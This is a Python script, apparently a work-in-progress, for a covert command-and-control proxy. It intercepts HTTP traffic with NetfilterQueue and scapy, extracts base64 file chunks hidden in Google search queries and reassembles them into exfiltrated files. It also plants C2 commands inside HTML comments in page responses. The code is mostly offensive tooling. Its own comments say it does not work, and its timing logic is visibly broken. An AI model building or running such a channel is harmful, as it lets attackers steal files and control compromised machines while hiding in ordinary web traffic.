from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw
import re, base64, os, time, urllib.parse

TARGET_HOST = b"www.google.com"
COVERT_CMD = "ACK"

file_chunks = {}
start_time = None


# TODO Fix this code its shite

# What does the error cuased from the file transfer come from


def save_chunk(data): #!!! This doesnt work for file transfer? Cannot get timings
    match = re.match(r"(\d+)/(\d+):([A-Za-z0-9+/=]+)", data)
    if not match:
        print(f"[PROXY] Invalid chunk format: {data[:50]}")
        return False

    idx, total, b64data = match.groups()
    idx = int(idx)
    total = int(total)

    if "file" not in file_chunks:
        file_chunks["file"] = [""] * total
        start_time = time.time()
        print(f"[PROXY] Starting file transfer: expecting {total} chunks")

    file_chunks["file"][idx] = b64data
    print(f"[PROXY] Received chunk {idx+1}/{total}")

    if any(c == "" for c in file_chunks["file"]):
        return False

    combined = "".join(file_chunks["file"])
    print(f"[DEBUG] Combined Base64 length: {len(combined)}")

    try: 
        padded = combined + "=" * ((4 - len(combined) % 4) % 4)
        file_bytes = base64.b64decode(padded)
    except Exception as e:
        print(f"[ERROR] Base64 decode failed: {e}")
        return False

    os.makedirs("received_files", exist_ok=True)
    out_path = f"received_files/received_{len(file_bytes)}B.bin"
    with open(out_path, "wb") as f:
        f.write(file_bytes)

    elapsed = time.time() - start_time
    print(f"[PROXY] File transfer complete: {out_path} in {elapsed:.2f}s")
    file_chunks.clear()
    return True

def inject_command(payload, command):
    try:
        html = payload.decode(errors="ignore")
        if "</body>" in html:
            html = html.replace("</body>", f"<!-- C2CMD:{command} --></body>")
        return html.encode()
    except Exception:
        return payload

def extract_covert_message(payload):
    try:
        data = payload.decode(errors="ignore")
        # Debug raw HTTP request
        first_line = data.split("\r\n")[0]
        print(f"[DEBUG] HTTP Request Line: {first_line}")

        # Capture everything after What+is+ until space or HTTP version
        match = re.search(r"GET /search\?q=What\+is\+([^ ]+)", data)
        if match:
            encoded = match.group(1)
            decoded = urllib.parse.unquote(encoded)
            print(f"[DEBUG] Extracted covert data: {decoded[:60]}...")
            return decoded
    except Exception as e:
        print(f"[ERROR] extract_covert_message failed: {e}")
    return None

def process_packet(pkt):
    scapy_pkt = IP(pkt.get_payload())

    if scapy_pkt.haslayer(TCP) and scapy_pkt.haslayer(Raw):
        tcp = scapy_pkt[TCP]
        raw_load = scapy_pkt[Raw].load

        if tcp.dport == 80 and TARGET_HOST in raw_load:
            covert_data = extract_covert_message(raw_load)
            if covert_data:
                done = save_chunk(covert_data)
                if done:
                    print("[PROXY] Final chunk processed and file saved.")

        if tcp.sport == 80 and b"</body>" in raw_load:
            new_payload = inject_command(raw_load, COVERT_CMD)
            scapy_pkt[Raw].load = new_payload
            del scapy_pkt[IP].len, scapy_pkt[IP].chksum, scapy_pkt[TCP].chksum
            pkt.set_payload(bytes(scapy_pkt))

    pkt.accept()

if __name__ == "__main__":
    print("[+] NFQUEUE proxy running with URL decoding and chunk debugging")
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, process_packet)
    nfqueue.run()
